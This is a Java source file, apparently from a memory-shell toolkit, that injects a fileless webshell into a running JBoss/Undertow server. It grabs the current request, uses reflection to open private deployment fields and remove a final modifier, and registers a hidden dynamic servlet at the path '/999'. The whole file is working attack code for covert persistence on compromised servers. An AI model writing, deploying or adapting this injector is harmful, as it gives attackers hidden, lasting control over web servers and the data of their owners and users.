package com.memshell.jboss;

import com.memshell.generic.Util;
import io.undertow.servlet.api.DeploymentInfo;
import io.undertow.servlet.api.ServletInfo;
import io.undertow.servlet.core.DeploymentImpl;
import io.undertow.servlet.handlers.ServletHandler;
import io.undertow.servlet.spec.HttpServletRequestImpl;
import io.undertow.servlet.spec.ServletRegistrationImpl;
import io.undertow.servlet.util.ConstructorInstanceFactory;
import javax.security.jacc.PolicyContext;
import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Map;

public class ServletBasedWithoutRequest extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        // 参考：
        // 《Dynamic Servlet Registration》 http://www.mastertheboss.com/javaee/servlet-30/dynamic-servlet-registration
        // 《JBOSS 无文件webshell的技术研究》 https://mp.weixin.qq.com/s/_SQS9B7tkL1H5fMIgPTOKw

        try{
            String servletName = "jbossServlet";
            String urlPattern = "/999";

            HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
            ServletContext context = request.getServletContext();
            Field f = context.getClass().getDeclaredField("deploymentInfo");
            f.setAccessible(true);
            DeploymentInfo deploymentInfo = (DeploymentInfo)f.get(context);

            //只添加一次
            Map<String, ServletInfo> servlets = deploymentInfo.getServlets();
            if(!servlets.containsKey(servletName)){
                System.out.println("[+] Add Dynamic Servlet");

                Class clazz = Util.getDynamicServletTemplateClass();
                ServletInfo servletInfo = new ServletInfo(servletName, clazz, new ConstructorInstanceFactory<Servlet>(clazz.getDeclaredConstructor()));
                deploymentInfo.addServlet(servletInfo);

                f = context.getClass().getDeclaredField("deployment");
                f.setAccessible(true);
                Field modifiersField = Field.class.getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                DeploymentImpl deployment = (DeploymentImpl)f.get(context);
                ServletHandler handler = deployment.getServlets().addServlet(servletInfo);

                ServletRegistrationImpl registration =  new ServletRegistrationImpl(servletInfo, handler.getManagedServlet(), deployment);
                registration.addMapping(urlPattern);
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
